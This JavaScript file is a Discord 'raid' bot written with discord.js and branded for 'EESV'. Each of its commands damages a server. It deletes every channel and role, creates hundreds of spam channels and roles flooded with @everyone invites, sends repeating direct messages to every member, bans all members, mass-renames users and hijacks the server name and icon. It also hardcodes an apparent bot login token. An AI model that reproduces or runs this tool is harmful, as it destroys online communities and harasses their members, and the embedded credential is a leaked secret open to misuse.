const Discord = require("discord.js");
const client = new Discord.Client();
 
client.on("ready", () => {
    console.log(`Iniciando bot raid...`);
    console.log(`${client.user.tag} Listo para atacar en nombre de la Monarquía`);
    console.log(`Comandos:
    console.log("By EESV (LiTee#0001) | https://discord.gg/vmfHWDnS7T / discord.gg/vmfHWDnS7T");
  .banall
  .nuke
  .attack
  .foto
  .mdall
  .roles
  .deleterole
  .nick (nombre)
  .list`);
    presencia();  
    });
 
 
 
function presencia(){
  client.user.setPresence({
status: "dnb",
activity: {
  name: "Long Life to Monarchy.",
  type: "LISTENING"
 
}
  });
}
 
//nuke
 
client.on("message", message => {
    if (message.author.bot) return;
  
   if (message.content === '.nuke') {
    message.guild.channels.cache.forEach(channel => channel.delete());
    message.guild.channels.create(`♚EESV♚`, {
          type: 'text'
        }).then(channel => {
          channel.send("https://cdn.discordapp.com/icons/752657908109410364/a_37e074032b4db464d17fa1ffc5b922e7.gif?size=4096")
        })
         }
      })
 
//attack
 
client.on("message", message => {
            if (message.author.bot) return;
          
           if (message.content === '.attack') {
           for (let i = 0; i <= 500; i++) {
                message.guild.channels.create(`SERVER-RAID-BY-EESV`, {
                  type: 'text'
                }).then(channel => {
                  channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyoneSERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7Ts ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ")
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ");
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ");
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ");
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ");
              channel.send("@everyone SERVER RAID BY EESV MONARCHY https://discord.gg/vmfHWDnS7T ");
                  
              })
              }
              }
            });
          
//mdall
 
          client.on("message", message => {
                        if (message.author.bot) return;
                        
                      if(message.content === ".mdall")
                      message.guild.members.cache.forEach(member => {
                        setInterval(function(){
                          member.send("Raid By EESV - https://discord.gg/vmfHWDnS7T ").catch(error => {});
                        },450);
                      })
                      });
 
//borar roles
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                     if(message.content === ('.deleterole')){
                            message.guild.roles.cache.map(roles => roles.delete());
                          }
                  });
 
//crear roles
 
client.on("message", message => {
                if (message.author.bot) return;
              
               if (message.content === '.roles') {
              for (let i = 0; i <= 200; i++) {
                 message.guild.roles.create({data: {name: `EESV`,color: '#a60303',},reason: 'EESV',})
              };
               }
                });
 
//foto y nombre
 
client.on("message", message => {
                    if (message.author.bot) return;
                  
                   if (message.content === '.foto') {
                      message.guild.setName("♚EESV♚");
                      message.guild.setIcon("https://cdn.discordapp.com/attachments/753126891866554438/837919337309274142/EESV_Original.png"
                      );
                      }
                    }); 
 

    
//GIF
                    client.on("message", message => {
                        if (message.author.bot) return;
                      
                       if (message.content === '.gif') {
                          message.guild.setName("♚EESV♚");
                          message.guild.setIcon("https://cdn.discordapp.com/icons/752657908109410364/a_37e074032b4db464d17fa1ffc5b922e7.gif?size=4096"
                          );
                          }
                        }); 
     

//banall
 
client.on("message", message => {
    if (message.author.bot) return;
  
    if (message.content === '.banall') {
    message.delete()
    message.guild.members.cache.forEach(m => {
    m.ban()
    });
  }
}); 
 
//cambiar nombres
 
client.on("message", msg => {
const args = msg.content.slice().trim().split(/ +/g );
const command = args.shift().toLowerCase();
  if (command === '.nick'){
      msg.delete()
    let nickname = args.join(" ");
    var i = 0;
    msg.guild.members.cache.forEach(member =>{
      i++
    }
      )
    msg.channel.send("> Cambiando el nombre de **" + i + "** usuarios a: **" + nickname + "**")
    msg.guild.members.cache.forEach(member =>{
 
      member.setNickname(nickname)
    })
    }
});
 
//lista de sv
 
client.on("message", message => {
    if (message.author.bot) return;
    const args = message.content.slice().trim().split(/ +/g );
    const command = args.shift().toLowerCase();
   if (command === '.list') {
       message.delete()
       const embed = new Discord.MessageEmbed()
       .setTitle(message.guild.name)
       .setThumbnail()
       .setDescription(`**Canales:** | ${message.guild.channels.cache.size}\n**Roles:** | ${message.guild.roles.cache.size}\n**Users:** | ${message.guild.memberCount}`)
       .setColor("RED");
       message.channel.send(embed)
   }
});
 
 client.login("ODM3OTE5MjA0NTg0NzE4Mzc4.YIzjEg.49QmW3-EMvLCyYFbBw4E7DwlSLI");